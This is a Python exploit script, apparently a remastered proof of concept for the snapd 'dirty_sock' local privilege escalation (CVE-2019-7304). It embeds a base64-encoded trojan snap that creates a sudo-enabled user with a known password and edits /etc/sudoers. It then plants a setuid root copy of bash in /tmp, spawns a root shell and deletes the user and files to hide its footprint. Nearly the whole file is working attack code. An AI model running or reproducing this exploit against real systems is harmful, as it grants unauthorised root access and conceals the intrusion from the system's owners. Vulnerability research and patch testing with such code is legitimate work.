#!/usr/bin/python3
#See https://github.com/f4T1H21/dirty_sock for more information.
#Remastered LPE PoC exploit for CVE-2019-7304 written by f4T1H credit goes to initstring.
import os, base64, time
try:
    print('[+] Creating file...'); f = open('malicious.snap', 'x')
    time.sleep(0.5); print('[+] Writing base64 decoded trojan...'); f = open('malicious.snap', 'wb')
    f.write(base64.b64decode('''
aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw''' + 'A' * 4256 + '=='))
    f.close()
    time.sleep(0.5); print('[+] Installing malicious snap...'); os.system('sudo snap install --dangerous --devmode ./malicious.snap')
    time.sleep(0.5); print('\n[+] Deleting snap package...'); os.remove('malicious.snap')
    time.sleep(0.5); print('[+] Granting setuid perms to bash as root...'); os.system('''su - dirty_sock <<! >/dev/null 2>&1
dirty_sock
echo '[+] Here comes the PoC:' >/dev/tty && echo 'dirty_sock' | sudo -Sk id >/dev/tty
echo 'dirty_sock' | sudo -kS cp /bin/bash /tmp/.bash >/dev/tty
echo 'dirty_sock' | sudo -kS chmod +s /tmp/.bash >/dev/tty
!''')
    time.sleep(0.5); print('\n[+] Deleting the previously created user...'); os.system('/tmp/.bash -p -c "pkill -e dirty_sock; userdel -r -f dirty_sock 2>/dev/null"')
    time.sleep(0.5); print('[+] Becoming root...'); os.system('/tmp/.bash -ip')
    time.sleep(0.5); print('[+] Removing footprint...'); os.system('/tmp/.bash -p -c "rm -rf /tmp/.bash"')
    time.sleep(0.5); print('\n    DONE!\n')
except Exception as e:
    print(f'Fatal error: \n{e}')
    exit()